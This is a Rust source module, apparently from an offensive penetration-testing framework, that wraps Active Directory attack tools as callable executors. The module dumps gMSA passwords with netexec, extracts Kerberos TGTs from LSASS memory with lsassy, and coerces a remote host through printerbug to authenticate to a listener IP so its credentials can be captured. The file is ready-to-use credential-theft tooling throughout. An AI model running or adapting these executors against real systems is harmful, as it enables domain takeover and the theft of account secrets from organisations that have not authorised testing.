//! gMSA and unconstrained delegation tool executors.

use anyhow::Result;
use serde_json::Value;

use crate::args::{optional_str, required_str};
use crate::credentials;
use crate::executor::CommandBuilder;
use crate::ToolOutput;

/// Dump gMSA passwords using netexec's gmsa module.
///
/// Required args: `dc_ip`, `username`, `password`, `domain`
pub async fn gmsa_dump_passwords(args: &Value) -> Result<ToolOutput> {
    let dc_ip = required_str(args, "dc_ip")?;
    let username = optional_str(args, "username");
    let password = optional_str(args, "password");
    let domain = optional_str(args, "domain");

    let creds = credentials::netexec_creds(username, password, None, domain);

    CommandBuilder::new("netexec")
        .arg("ldap")
        .arg(dc_ip)
        .args(creds)
        .args(["-M", "gmsa"])
        .timeout_secs(120)
        .execute()
        .await
}

/// Dump TGTs from memory on an unconstrained delegation host using lsassy.
///
/// Required args: `domain`, `username`, `password`, `target_host`
pub async fn unconstrained_tgt_dump(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let target_host = required_str(args, "target_host")?;

    CommandBuilder::new("lsassy")
        .flag("-d", domain)
        .flag("-u", username)
        .flag("-p", password)
        .arg(target_host)
        .args(["-m", "direct"])
        .timeout_secs(180)
        .execute()
        .await
}

/// Coerce authentication from a remote host using printerbug.py (SpoolService).
///
/// Required args: `domain`, `username`, `password`, `coerce_from`, `listener_ip`
pub async fn unconstrained_coerce_and_capture(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let coerce_from = required_str(args, "coerce_from")?;
    let listener_ip = required_str(args, "listener_ip")?;

    let creds = format!("{domain}/{username}:{password}@{coerce_from}");

    CommandBuilder::new("printerbug")
        .arg(creds)
        .arg(listener_ip)
        .timeout_secs(60)
        .execute()
        .await
}
